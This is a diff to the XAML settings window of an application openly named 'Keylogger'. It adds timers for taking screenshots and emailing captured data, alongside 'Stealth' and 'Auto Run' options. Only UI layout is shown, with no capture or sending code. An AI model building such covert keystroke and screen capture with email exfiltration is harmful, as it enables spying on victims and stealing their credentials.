@@ -1,23 +1,29 @@
-﻿<Window x:Class="Keylogger.MainWindow"
+﻿<Window x:Class="Keylogger.MainWindow" 
         xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
-        Title="Keylogger" Height="256" Width="400" Loaded="Window_Loaded" Closed="Window_Closed" Opacity="1"  >
+        Title="Keylogger" Height="256" Width="400" Loaded="Window_Loaded" Closed="Window_Closed" Opacity="1" >
     <Grid Height="217" Width="379">
         <GroupBox Header="Properties" Height="190" HorizontalAlignment="Left" Margin="12,12,0,0" Name="groupBox1" VerticalAlignment="Top" Width="361" >
-            <Grid>
-                <Button Content="Save" Height="23" HorizontalAlignment="Left" Margin="243,135,0,0" Name="button1" VerticalAlignment="Top" Width="75" />
-                <TextBox Height="23" HorizontalAlignment="Left" Margin="158,36,0,0" x:Name="emailblock"  VerticalAlignment="Top" Width="160" TextChanged="tblock_TextChanged" />
+            <Grid RenderTransformOrigin="0.587,0.476">
+                <TextBox Height="23" HorizontalAlignment="Left" Margin="158,36,0,0" x:Name="txtBoxMail"  VerticalAlignment="Top" Width="160" TextChanged="tblock_TextChanged" />
                 <TextBlock Height="24" HorizontalAlignment="Left" Margin="158,6,0,0" Name="textBlock1" Text="Email" VerticalAlignment="Top" Width="107" />
-                <CheckBox Content=" Auto Run" Height="16" HorizontalAlignment="Left" Margin="15,36,0,0" Name="CheckAuto" VerticalAlignment="Top" Width="77"
+                <CheckBox Content=" Auto Run" Height="16" HorizontalAlignment="Left" Margin="10,23,0,0" Name="CheckAuto" VerticalAlignment="Top" Width="77"
                            Checked="AutoRun_Check" Unchecked="AutoRun_UnChecked" IsThreeState="False"   />
-                <CheckBox x:Name="CheckStealth" Checked="Stealth_Checked" Unchecked="Stealth_Unchecked" Content="Stealth" HorizontalAlignment="Left" Margin="15,57,0,0" VerticalAlignment="Top"/>
-                <Label x:Name="label" Content="Timer" HorizontalAlignment="Left" Margin="158,72,0,0" VerticalAlignment="Top"/>
-                <StackPanel Orientation="Horizontal" Margin="158,98,87,40">
-                    <TextBox x:Name="txtNum" x:FieldModifier="private" Margin="5,5,0,5" Width="50" Text="0" TextChanged="txtNum_TextChanged" />
-                    <Button x:Name="cmdUp" x:FieldModifier="private" Margin="5,5,0,5" Content="˄" Width="20" Click="cmdUp_Click" />
-                    <Button x:Name="cmdDown" x:FieldModifier="private" Margin="0,5,0,5"  Content="˅" Width="20" Click="cmdDown_Click" />
+                <CheckBox x:Name="CheckStealth" Checked="Stealth_Checked" Unchecked="Stealth_Unchecked" Content="Stealth" HorizontalAlignment="Left" Margin="10,44,0,0" VerticalAlignment="Top" RenderTransformOrigin="0.497,0.482"/>
+                <Label x:Name="labelTimerSrceenShot" Content="Timer Screen Shot" HorizontalAlignment="Left" Margin="158,67,0,0" VerticalAlignment="Top"/>
+                <StackPanel Orientation="Horizontal" Margin="158,93,87,45">
+                    <TextBox x:Name="txtNumScreen" x:FieldModifier="private" Margin="5,5,0,5" Width="50" Text="0" TextChanged="txtNumScreen_TextChanged" />
+                    <Button x:Name="cmdUpScreen" x:FieldModifier="private" Margin="5,5,0,5" Content="˄" Width="20" Click="cmdUpScreen_Click" />
+                    <Button x:Name="cmdDownScreen" x:FieldModifier="private" Margin="0,5,0,5"  Content="˅" Width="20" Click="cmdDownScreen_Click" />
                 </StackPanel>
-                <Label x:Name="labeltime" Content="0" HorizontalAlignment="Left" Margin="211,72,0,0" VerticalAlignment="Top" RenderTransformOrigin="0.535,-0.026"/>
+                <Label x:Name="labeltimescreen" Content="0" HorizontalAlignment="Left" Margin="276,67,0,0" VerticalAlignment="Top" RenderTransformOrigin="0.535,-0.026"/>
+                <StackPanel Orientation="Horizontal" Margin="10,93,235,45">
+                    <TextBox x:Name="txtNumMail" x:FieldModifier="private" Margin="5,5,0,5" Width="50" Text="0" TextChanged="txtNumMail_TextChanged" />
+                    <Button x:Name="cmdUpMail" x:FieldModifier="private" Margin="5,5,0,5" Content="˄" Width="20" Click="cmdUpMail_Click" />
+                    <Button x:Name="cmdDownMail" x:FieldModifier="private" Margin="0,5,0,5"  Content="˅" Width="20" Click="cmdDownMail_Click" />
+                </StackPanel>
+                <Label x:Name="labelTimerSendMail" Content="Timer Send Mail" HorizontalAlignment="Left" Margin="10,67,0,0" VerticalAlignment="Top"/>
+                <Label x:Name="labeltimemail" Content="0" HorizontalAlignment="Left" Margin="111,67,0,0" VerticalAlignment="Top"/>
             </Grid>
         </GroupBox>
     </Grid>
